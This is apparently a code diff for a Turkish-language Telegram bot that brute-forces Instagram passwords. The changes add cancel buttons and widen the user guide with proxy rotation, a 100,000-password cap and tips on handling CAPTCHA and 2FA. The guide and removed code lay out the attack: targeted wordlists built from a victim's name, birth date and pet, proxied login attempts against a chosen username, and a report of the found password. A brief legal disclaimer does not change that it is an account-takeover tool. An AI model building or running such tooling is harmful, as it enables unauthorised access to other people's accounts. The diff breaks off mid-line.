+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await query.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -1081,7 +1262,8 @@ class TelegramBot:
         elif query.data == 'skip_keywords':
             self.user_data[user_id]['password_profile']['keywords'] = []
             keyboard = [
-                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
+                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
@@ -1095,20 +1277,22 @@ class TelegramBot:
                 "👾 V.VV SUNAR HACKER V3.0 ile Instagram hesaplarını test etmek çok kolay! 🔥\n"
                 "⚠️ *Yasal Uyarı*: Bu botu sadece kendi hesabın veya izinli testler için kullan! Yasadışı kullanım seni başını belaya sokar, kankam! 😎\n\n"
                 "*Adım Adım Kullanım:*\n"
-                "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz.\n"
+                "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz (max 30 karakter).\n"
                 "2. *Şifre Listesi Yükle veya Oluştur* 📜🔑:\n"
                 "   - *Yükle*: Hazır bir .txt dosyasında şifre listeni yükle (her satır bir şifre, max 512 karakter).\n"
-                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap. Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
-                "3. *Proxy Listesi Yükle* 🌐 (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle.\n"
+                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap (max 100.000 şifre). Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
+                "3. *Proxy Listesi Yükle* 🌐 (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle veya bot otomatik proxy çeker.\n"
                 "4. *Timeout Ayarla* ⏰: İşlemin ne kadar süreceğini (60-7200 saniye) belirle.\n"
                 "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force’u başlat. İşlem bitince rapor alacaksın:\n"
                 "   - Denenen şifre sayısı\n"
-                "   - Hata alınan şifreler (doğru olabilir, manuel kontrol et)\n\n"
+                "   - Hata alınan şifreler (doğru olabilir, manuel kontrol et)\n"
+                "   - İşlem logları (instagram_response.json olarak indirilir)\n\n"
                 "*💡 İpuçları*:\n"
                 "- Boş bırakmak için her adımda *Boş Bırak* butonunu kullan.\n"
+                "- İşlemi durdurmak için *İptal* butonuna bas.\n"
                 "- Şifre listesi oluştururken çok fazla kelime ekleme, yoksa liste devasa olur! 😅\n"
-                "- Hata alırsan, /start ile yeniden başla.\n"
-                "- Loglar ve hata alınan şifreler *instagram_response.json* dosyasında saklanır.\n\n"
+                "- CAPTCHA çıkarsa, Instagram’a gidip manuel çözmen gerekir.\n"
+                "- 2FA veya checkpoint çıkarsa, doğru şifreyi bulduk ama doğrulama yapman lazım!\n\n"
                 "*🚀 Hadi Başla!* Menüden bir seçenek seç ve keyfine bak! 😜"
             )
             keyboard = [
@@ -1117,7 +1301,8 @@ class TelegramBot:
                 [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                 [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                 [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
-                [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
+                [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
@@ -1125,6 +1310,23 @@ class TelegramBot:
             except TelegramError as e:
                 logger.error(f"Telegram send_message error: {e}")
                 await query.message.reply_text("❌ Kullanım kılavuzu gönderilirken hata oluştu, lütfen tekrar dene!")
+        elif query.data == 'cancel':
+            context.user_data['awaiting'] = None
+            keyboard = [
+                [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
+                [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+                [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
+                [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
+                [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+                [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
+                [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("❌ İşlem iptal edildi. Başka ne yapmak istersin?", reply_markup=reply_markup)
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
         else:
             try:
                 await query.message.reply_text("❌ Geçersiz işlem! Lütfen /start ile yeniden başla.")
@@ -1134,6 +1336,11 @@ class TelegramBot:
     async def generate_password_file(self, query: Update, user_id: int):
         profile = self.user_data[user_id]['password_profile']
         wordlist = self.password_generator.generate_wordlist(profile)
+        if len(wordlist) >= self.password_generator.max_passwords:
+            try:
+                await query.message.reply_text(f"⚠️ Şifre listesi {self.password_generator.max_passwords} sınırı aştı, ilk {self.password_generator.max_passwords} şifre kaydedildi.")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
         file_path = f"passwords_{user_id}.txt"
         with open(file_path, 'w', encoding='utf-8') as f:
             f.write('\n'.join(wordlist))
@@ -1141,140 +1348,4 @@ class TelegramBot:
         try:
             await query.message.reply_text(f"✅ Şifre listesi oluşturuldu! {len(wordlist)} şifre kaydedildi.")
             await query.message.reply_document(document=InputFile(file_path, filename='generated_passwords.txt'))
-        except TelegramError as e:
-            logger.error(f"Telegram send_document error: {e}")
-            await query.message.reply_text("❌ Şifre listesi gönderilirken hata oluştu!")
-        keyboard = [
-            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
-            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
-            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
-            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
-            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
-            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
-            [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        try:
-            await query.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)
-        except TelegramError as e:
-            logger.error(f"Telegram send_message error: {e}")
-
-    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = update.effective_user.id
-        query = update.callback_query
-
-        try:
-            await query.message.reply_text("🚀 Saldırı başladığında bildirileceksin, şu an gerekli kurulumlar yapılıyor...")
-        except TelegramError as e:
-            logger.error(f"Telegram send_message error: {e}")
-            return
-
-        if user_id in self.brute_force_tasks and not self.brute_force_tasks[user_id].done():
-            try:
-                await query.message.reply_text("⚠️ Saldırı zaten devam ediyor!")
-            except TelegramError as e:
-                logger.error(f"Telegram send_message error: {e}")
-            return
-
-        if not self.user_data[user_id]['username']:
-            try:
-                await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
-            except TelegramError as e:
-                logger.error(f"Telegram send_message error: {e}")
-            return
-        if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
-            try:
-                await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
-            except TelegramError as e:
-                logger.error(f"Telegram send_message error: {e}")
-            return
-
-        try:
-            passwords = []
-            encodings = ['utf-8', 'latin-1', 'iso-8859-9']
-            for encoding in encodings:
-                try:
-                    with open(self.user_data[user_id]['password_file'], 'r', encoding=encoding, errors='ignore') as f:
-                        passwords = [line.strip() for line in f if line.strip() and len(line.strip()) <= 512]
-                    break
-                except UnicodeDecodeError:
-                    continue
-
-            if not passwords:
-                try:
-                    await query.message.reply_text("❌ Şifre dosyası okunamadı veya boş! Geçerli bir dosya yükle.")
-                except TelegramError as e:
-                    logger.error(f"Telegram send_message error: {e}")
-                return
-
-            proxy_list = []
-            if self.user_data[user_id]['proxy_file'] and os.path.exists(self.user_data[user_id]['proxy_file']):
-                for encoding in encodings:
-                    try:
-                        with open(self.user_data[user_id]['proxy_file'], 'r', encoding=encoding, errors='ignore') as f:
-                            proxy_list = [line.strip() for line in f if line.strip()]
-                        break
-                    except UnicodeDecodeError:
-                        continue
-
-            core = InstagramBruteForce(proxy_list=proxy_list)
-
-            async def progress_callback(message):
-                try:
-                    await query.message.reply_text(message)
-                except TelegramError as e:
-                    logger.error(f"Telegram send_message error in progress_callback: {e}")
-
-            task = asyncio.create_task(
-                core.brute_force(
-                    self.user_data[user_id]['username'],
-                    passwords,
-                    self.user_data[user_id]['timeout'],
-                    progress_callback=progress_callback
-                )
-            )
-            self.brute_force_tasks[user_id] = task
-            result = await task
-            if result:
-                try:
-                    await query.message.reply_text(f"🎉 *BAŞARILI! Şifre bulundu: {result}*", parse_mode='Markdown')
-                except TelegramError as e:
-                    logger.error(f"Telegram send_message error: {e}")
-            else:
-                try:
-                    await query.message.reply_text(f"❌ İşlem tamamlandı, doğru şifre bulunamadı.", parse_mode='Markdown')
-                except TelegramError as e:
-                    logger.error(f"Telegram send_message error: {e}")
-
-        except Exception as e:
-            try:
-                await query.message.reply_text(f"❌ Başlatma hatası: {str(e)}", parse_mode='Markdown')
-            except TelegramError as e:
-                logger.error(f"Telegram send_message error: {e}")
-        finally:
-            if user_id in self.brute_force_tasks:
-                del self.brute_force_tasks[user_id]
-            # Dosya temizliği
-            for file_path in [self.user_data[user_id]['password_file'], self.user_data[user_id]['proxy_file']]:
-                if file_path and os.path.exists(file_path):
-                    try:
-                        os.remove(file_path)
-                        try:
-                            await query.message.reply_text(f"🗑️ Dosya silindi: {file_path}")
-                        except TelegramError as e:
-                            logger.error(f"Telegram send_message error: {e}")
-                    except Exception as e:
-                        logger.error(f"Dosya silme hatası: {file_path}, {str(e)}")
-
-async def main():
-    bot = TelegramBot()
-    application = Application.builder().token(TOKEN).build()
-    application.add_handler(CommandHandler("start", bot.start))
-    application.add_handler(CallbackQueryHandler(bot.button))
-    application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, bot.handle_message))
-    await application.run_polling()
-
-if __name__ == "__main__":
-    import nest_asyncio
-    nest_asyncio.apply()
-    asyncio.run(main())
+        except Telegram
